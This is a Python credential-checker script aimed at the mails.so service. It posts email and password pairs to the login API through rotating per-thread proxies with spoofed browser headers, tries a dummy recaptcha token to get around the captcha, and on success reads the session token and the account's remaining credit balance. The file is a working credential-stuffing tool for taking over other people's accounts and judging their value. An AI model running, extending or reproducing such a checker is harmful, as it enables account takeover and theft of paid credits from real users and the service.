"""
Checker for mails.so – with debug output for failures.
"""
import requests
import threading
import json
from typing import Tuple

BASE_URL = "https://api.mails.so"
LOGIN_URL = BASE_URL + "/auth/login"
BILLING_URL = BASE_URL + "/client/billing/status?stripe=true"
TIMEOUT = 15

# Set to True to see debug output
DEBUG = True

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mails.so",
        "Referer": "https://mails.so/login",
    })

    # Try without recaptchaToken first, then with a dummy if needed
    payloads = [
        {"email": email, "password": password},  # no token
        {"email": email, "password": password, "recaptchaToken": "dummy_token"},
    ]

    for payload in payloads:
        try:
            if DEBUG:
                print(f"[DEBUG] Trying payload: {payload}")

            resp = session.post(LOGIN_URL, json=payload, timeout=TIMEOUT)
            if DEBUG:
                print(f"[DEBUG] Status: {resp.status_code}")
                print(f"[DEBUG] Response: {resp.text[:500]}")

            # If status is 200, try to parse JSON
            if resp.status_code == 200:
                try:
                    data = resp.json()
                except ValueError:
                    continue  # try next payload

                # Check for success
                if data.get("status") == "success" or data.get("message") == "Logged in":
                    # Extract token
                    token = None
                    for key in ["token", "access_token", "jwt", "data.token", "data.access_token"]:
                        parts = key.split(".")
                        val = data
                        for part in parts:
                            if isinstance(val, dict) and part in val:
                                val = val[part]
                            else:
                                val = None
                                break
                        if val:
                            token = val
                            break
                    if token:
                        session.headers.update({"Authorization": f"Bearer {token}"})

                    # Fetch credits
                    try:
                        bill_resp = session.get(BILLING_URL, timeout=TIMEOUT)
                        if bill_resp.status_code == 200:
                            bill_data = bill_resp.json()
                            balance = bill_data.get("balance", {})
                            monthly = balance.get("remaining_monthly", 0)
                            extra = balance.get("remaining_extra", 0)
                            total = monthly + extra
                            return True, f"Login successful. Credits: {total} (monthly: {monthly}, extra: {extra})"
                        else:
                            return True, f"Login successful (could not fetch credits: HTTP {bill_resp.status_code})"
                    except Exception as e:
                        return True, f"Login successful (could not fetch credits: {str(e)})"

                # If we get an error message
                msg = data.get("message", "")
                if msg:
                    if DEBUG:
                        print(f"[DEBUG] Error message: {msg}")
                    return False, f"Login failed: {msg}"

                # If token present but no success status, assume success
                if "token" in data or "user" in data:
                    return True, "Login successful (token received)"

                # Otherwise, continue to next payload
                continue

            else:
                # Non-200 status – try to get error message
                try:
                    err_data = resp.json()
                    msg = err_data.get("message", resp.text)
                    return False, f"Login failed (HTTP {resp.status_code}): {msg}"
                except:
                    return False, f"Login failed (HTTP {resp.status_code})"

        except Exception as e:
            if DEBUG:
                print(f"[DEBUG] Exception: {e}")
            continue

    return False, "Login failed – all attempts exhausted"